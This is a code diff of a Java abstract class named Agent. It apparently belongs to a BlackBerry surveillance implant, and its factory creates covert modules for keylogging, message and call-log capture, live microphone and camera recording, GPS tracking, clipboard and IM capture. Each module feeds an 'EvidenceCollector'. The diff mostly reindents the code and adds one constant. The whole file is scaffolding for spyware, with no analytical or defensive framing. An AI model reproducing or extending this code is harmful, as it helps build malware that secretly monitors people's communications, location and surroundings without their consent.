@@ -21,241 +21,244 @@ import blackberry.utils.Check;
  * The Class Agent.
  */
 public abstract class Agent extends TimerJob {
-    //#ifdef DEBUG
-    private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
-    //#endif
+	//#ifdef DEBUG
+	private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
+	//#endif
 
-    public static final int AGENT = 0x1000;
-    public static final int AGENT_INFO = AGENT;
-    public static final int AGENT_MESSAGE = AGENT + 0x1;
-    public static final int AGENT_TASK = AGENT + 0x2;
-    public static final int AGENT_CALLLIST = AGENT + 0x3;
-    public static final int AGENT_DEVICE = AGENT + 0x4;
-    public static final int AGENT_POSITION = AGENT + 0x5;
-    public static final int AGENT_CALL = AGENT + 0x6;
-    public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
-    public static final int AGENT_KEYLOG = AGENT + 0x8;
-    public static final int AGENT_SNAPSHOT = AGENT + 0x9;
-    public static final int AGENT_URL = AGENT + 0xa;
-    public static final int AGENT_IM = AGENT + 0xb; //4107
-    // public static final int AGENT_EMAIL = AGENT + 0xc;
-    public static final int AGENT_MIC = AGENT + 0xd;
-    public static final int AGENT_CAM = AGENT + 0xe;
-    public static final int AGENT_CLIPBOARD = AGENT + 0xf;
-    public static final int AGENT_CRISIS = AGENT + 0x10;
-    public static final int AGENT_APPLICATION = AGENT + 0x11;
-    public static final int AGENT_LIVE_MIC = AGENT + 0x12;
-    public static final int AGENT_PDA = 0xDF7A;
+	public static final int AGENT = 0x1000;
+	public static final int AGENT_INFO = AGENT;
+	public static final int AGENT_MESSAGE = AGENT + 0x1;
+	public static final int AGENT_TASK = AGENT + 0x2;
+	public static final int AGENT_CALLLIST = AGENT + 0x3;
+	public static final int AGENT_DEVICE = AGENT + 0x4;
+	public static final int AGENT_POSITION = AGENT + 0x5;
+	public static final int AGENT_CALL = AGENT + 0x6;
+	public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
+	public static final int AGENT_KEYLOG = AGENT + 0x8;
+	public static final int AGENT_SNAPSHOT = AGENT + 0x9;
+	public static final int AGENT_URL = AGENT + 0xa;
+	public static final int AGENT_IM = AGENT + 0xb; // 4107
+	// public static final int AGENT_EMAIL = AGENT + 0xc;
+	public static final int AGENT_MIC = AGENT + 0xd;
+	public static final int AGENT_CAM = AGENT + 0xe;
+	public static final int AGENT_CLIPBOARD = AGENT + 0xf;
+	public static final int AGENT_CRISIS = AGENT + 0x10;
+	public static final int AGENT_APPLICATION = AGENT + 0x11;
+	public static final int AGENT_LIVE_MIC = AGENT + 0x12;
+	public static final int AGENT_PDA = 0xDF7A;
 
-    /**
-     * Factory.
-     * 
-     * @param agentId
-     *            the agent id
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     * @return the agent
-     */
-    public static Agent factory(final int agentId, final boolean agentStatus,
-            final byte[] confParams) {
+	public static final int AGENT_ENABLED = 0x2;
 
-        //#ifdef DBC
-        Check.requires(confParams != null, "factory: confParams != null");
-        //#endif
+	/**
+	 * Factory.
+	 * 
+	 * @param agentId
+	 *            the agent id
+	 * @param agentStatus
+	 *            the agent status
+	 * @param confParams
+	 *            the conf params
+	 * @return the agent
+	 */
+	public static Agent factory(final int agentId, final boolean agentStatus,
+			final byte[] confParams) {
 
-        switch (agentId) {
-        case AGENT_MESSAGE:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_MESSAGE "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new MessageAgent(agentStatus, confParams);
-        case AGENT_TASK:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_TASK "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new TaskAgent(agentStatus, confParams);
-        case AGENT_CALLLIST:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CALLLIST "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new CallListAgent(agentStatus, confParams);
-        case AGENT_DEVICE:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_DEVICE "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            ;
-            //#endif
-            return new DeviceInfoAgent(agentStatus, confParams);
-        case AGENT_POSITION:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_POSITION "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new PositionAgent(agentStatus, confParams);
-        case AGENT_CALL:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CALL "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new CallAgent(agentStatus, confParams);
-        case AGENT_CALL_LOCAL:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CALL_LOCAL "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new CallLocalAgent(agentStatus, confParams);
-        case AGENT_KEYLOG:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_KEYLOG "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new KeyLogAgent(agentStatus, confParams);
-        case AGENT_SNAPSHOT:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_SNAPSHOT "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new SnapShotAgent(agentStatus, confParams);
-        case AGENT_URL:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_URL "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new UrlAgent(agentStatus, confParams);
-        case AGENT_IM:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_IM "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new ImAgent(agentStatus, confParams);
-        case AGENT_MIC:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_MIC "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new MicAgent(agentStatus, confParams);
-        case AGENT_CAM:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CAM "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new CamAgent(agentStatus, confParams);
-        case AGENT_CLIPBOARD:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CLIPBOARD "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new ClipBoardAgent(agentStatus, confParams);
-        case AGENT_CRISIS:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_CRISIS "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new CrisisAgent(agentStatus, confParams);
-        case AGENT_APPLICATION:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_APPLICATION "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new ApplicationAgent(agentStatus, confParams);
-        case AGENT_PDA:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_PDA "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            return new PdaAgent(agentStatus, confParams);
-        case AGENT_LIVE_MIC:
-            //#ifdef DEBUG
-            debug.trace("Factory *** AGENT_LIVE_MIC "
-                    + (agentStatus ? "enabled" : "disabled") + " ***");
-            //#endif
-            //#ifdef ENABLE_LIVE_MIC_AGENT
-            return new LiveMicAgent(agentStatus, confParams);
-            //#else
-            return null;
-            //#endif
-        default:
-            //#ifdef DEBUG
-            debug.trace("AgentId UNKNOWN: " + agentId);
-            //#endif
-            return null;
-        }
-    }
+		//#ifdef DBC
+		Check.requires(confParams != null, "factory: confParams != null");
+		//#endif
 
-    Status status;
+		switch (agentId) {
+		case AGENT_MESSAGE:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_MESSAGE "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new MessageAgent(agentStatus, confParams);
+		case AGENT_TASK:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_TASK "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new TaskAgent(agentStatus, confParams);
+		case AGENT_CALLLIST:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CALLLIST "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new CallListAgent(agentStatus, confParams);
+		case AGENT_DEVICE:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_DEVICE "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			;
+			//#endif
+			return new DeviceInfoAgent(agentStatus, confParams);
+		case AGENT_POSITION:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_POSITION "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new PositionAgent(agentStatus, confParams);
+		case AGENT_CALL:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CALL "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new CallAgent(agentStatus, confParams);
+		case AGENT_CALL_LOCAL:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CALL_LOCAL "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new CallLocalAgent(agentStatus, confParams);
+		case AGENT_KEYLOG:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_KEYLOG "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new KeyLogAgent(agentStatus, confParams);
+		case AGENT_SNAPSHOT:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_SNAPSHOT "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new SnapShotAgent(agentStatus, confParams);
+		case AGENT_URL:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_URL "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new UrlAgent(agentStatus, confParams);
+		case AGENT_IM:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_IM "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new ImAgent(agentStatus, confParams);
+		case AGENT_MIC:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_MIC "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new MicAgent(agentStatus, confParams);
+		case AGENT_CAM:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CAM "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new CamAgent(agentStatus, confParams);
+		case AGENT_CLIPBOARD:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CLIPBOARD "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new ClipBoardAgent(agentStatus, confParams);
+		case AGENT_CRISIS:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_CRISIS "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new CrisisAgent(agentStatus, confParams);
+		case AGENT_APPLICATION:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_APPLICATION "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new ApplicationAgent(agentStatus, confParams);
+		case AGENT_PDA:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_PDA "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			return new PdaAgent(agentStatus, confParams);
+		case AGENT_LIVE_MIC:
+			//#ifdef DEBUG
+			debug.trace("Factory *** AGENT_LIVE_MIC "
+					+ (agentStatus ? "enabled" : "disabled") + " ***");
+			//#endif
+			//#ifdef ENABLE_LIVE_MIC_AGENT
+			return new LiveMicAgent(agentStatus, confParams);
+			// #else
+			return null;
+			//#endif
+		default:
+			//#ifdef DEBUG
+			debug.trace("AgentId UNKNOWN: " + agentId);
+			//#endif
+			return null;
+		}
+	}
 
-    EvidenceCollector logCollector;
+	Status status;
 
-    boolean logOnSD;
-    public int agentId;
+	EvidenceCollector logCollector;
 
-    // public int agentStatus;
+	boolean logOnSD;
+	public int agentId;
 
-    // public int command;
+	// public int agentStatus;
 
-    protected Evidence evidence;
+	// public int command;
 
-    /**
-     * Instantiates a new agent.
-     * 
-     * @param agentId_
-     *            the agent id_
-     * @param agentEnabled
-     *            the agent enabled
-     * @param logOnSD_
-     *            the log on s d_
-     * @param name
-     *            the name
-     */
-    protected Agent(final int agentId_, final boolean agentEnabled,
-            final boolean logOnSD_, final String name) {
-        super(name);
-        status = Status.getInstance();
-        logCollector = EvidenceCollector.getInstance();
+	protected Evidence evidence;
 
-        agentId = agentId_;
+	/**
+	 * Instantiates a new agent.
+	 * 
+	 * @param agentId_
+	 *            the agent id_
+	 * @param agentEnabled
+	 *            the agent enabled
+	 * @param logOnSD_
+	 *            the log on s d_
+	 * @param name
+	 *            the name
+	 */
+	protected Agent(final int agentId_, final boolean agentEnabled,
+			final boolean logOnSD_, final String name) {
+		super(name);
+		status = Status.getInstance();
+		logCollector = EvidenceCollector.getInstance();
 
-        logOnSD = logOnSD_;
-        evidence = logCollector.factory(this, logOnSD_);
+		agentId = agentId_;
 
-        enable(agentEnabled);
-    }
+		logOnSD = logOnSD_;
+		evidence = logCollector.factory(this, logOnSD_);
 
-    public void init(final boolean agentEnabled, final byte[] confParams) {
-        parse(confParams);
-        enable(agentEnabled);
-    }
+		enable(agentEnabled);
+	}
 
-    /**
-     * On sd.
-     * 
-     * @return true, if successful
-     */
-    public final boolean onSD() {
-        return logOnSD;
-    }
+	public void init(final boolean agentEnabled, final byte[] confParams) {
+		parse(confParams);
+		enable(agentEnabled);
+	}
 
-    /**
-     * Parses the.
-     * 
-     * @param confParameters
-     *            the conf parameters
-     * @return true, if successful
-     */
-    protected abstract boolean parse(byte[] confParameters);
+	/**
+	 * On sd.
+	 * 
+	 * @return true, if successful
+	 */
+	public final boolean onSD() {
+		return logOnSD;
+	}
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#toString()
-     */
-    public final String toString() {
-        return "Agent " + name + "|" + agentId;
+	/**
+	 * Parses the.
+	 * 
+	 * @param confParameters
+	 *            the conf parameters
+	 * @return true, if successful
+	 */
+	protected abstract boolean parse(byte[] confParameters);
 
-    }
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see blackberry.threadpool.TimerJob#toString()
+	 */
+	public final String toString() {
+		return "Agent " + name + "|" + agentId;
+
+	}
 
 }
